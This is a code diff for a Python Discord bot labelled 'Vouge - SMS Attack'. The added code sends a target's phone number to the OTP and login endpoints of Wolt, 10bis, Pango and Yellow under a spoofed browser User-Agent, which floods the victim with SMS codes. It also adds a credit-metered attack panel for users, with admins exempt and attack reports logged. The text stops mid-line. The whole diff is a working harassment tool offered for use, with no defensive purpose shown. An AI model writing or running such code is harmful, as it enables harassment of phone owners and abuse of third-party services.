@@ -50,8 +50,70 @@ async def run_attack(phone):
     clean_p = phone[1:] if phone.startswith('0') else phone
     success, failed = 0, 0
     
+    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    
     targets = [
-        {
-            "url": "https://api.wolt.com/v1/user/login/otp", 
-            "json": {"phone": f"+972{clean_p}"},
-            "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/
+        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{clean_p}"}, "headers": {"User-Agent": ua}},
+        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone, "isSmsAuth": True}, "headers": {"User-Agent": ua, "Content-Type": "application/json"}},
+        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}, "headers": {"User-Agent": ua}},
+        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone}, "headers": {"User-Agent": ua}}
+    ]
+    
+    ssl_ctx = create_ssl_context()
+    async with httpx.AsyncClient(verify=ssl_ctx, timeout=15.0) as client:
+        for t in targets:
+            try:
+                resp = await client.post(t["url"], json=t["json"], headers=t["headers"])
+                if 200 <= resp.status_code < 300: success += 1
+                else: failed += 1
+            except: failed += 1
+    return success, failed
+
+# --- UI: פאנל שליטה ---
+class AttackModal(discord.ui.Modal, title="Vouge - SMS Attack"):
+    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)
+    async def on_submit(self, interaction: discord.Interaction):
+        data = get_data()
+        uid = str(interaction.user.id)
+        is_admin = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) or interaction.user.id == MY_USER_ID
+        
+        if self.phone.value in data["blacklist"]:
+            return await interaction.response.send_message("❌ המספר חסום!", ephemeral=True)
+        
+        user_bal = data["credits"].get(uid, 0)
+        if not is_admin and user_bal <= 0:
+            return await interaction.response.send_message("❌ אין לך קרדיטים!", ephemeral=True)
+        
+        if not is_admin and user_bal < 900000:
+            data["credits"][uid] -= 1
+            save_data(data)
+
+        await interaction.response.send_message(f"💣 תקיפה על {self.phone.value} יצאה לדרך!", ephemeral=True)
+        s, f = await run_attack(self.phone.value)
+        
+        report = f"**משתמש:** {interaction.user.mention}\n**יעד:** {self.phone.value}\n✅ הצלחות: `{s}` | ❌ כשלונות: `{f}`"
+        await send_log(interaction.client, "🚀 דוח תקיפה", report, discord.Color.red())
+
+class ControlPanelView(discord.ui.View):
+    def __init__(self): super().__init__(timeout=None)
+    @discord.ui.button(label="Start Attack", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="at_btn")
+    async def at_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(AttackModal())
+
+# --- Bot Core ---
+class MyBot(commands.Bot):
+    def __init__(self):
+        intents = discord.Intents.default()
+        intents.members = True 
+        intents.message_content = True
+        super().__init__(command_prefix="!", intents=intents)
+    async def setup_hook(self):
+        self.add_view(ControlPanelView())
+        await self.tree.sync()
+
+bot = MyBot()
+
+def is_owner(interaction: discord.Interaction):
+    return discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) or interaction.user.id == MY_USER_ID
+
+@bot.
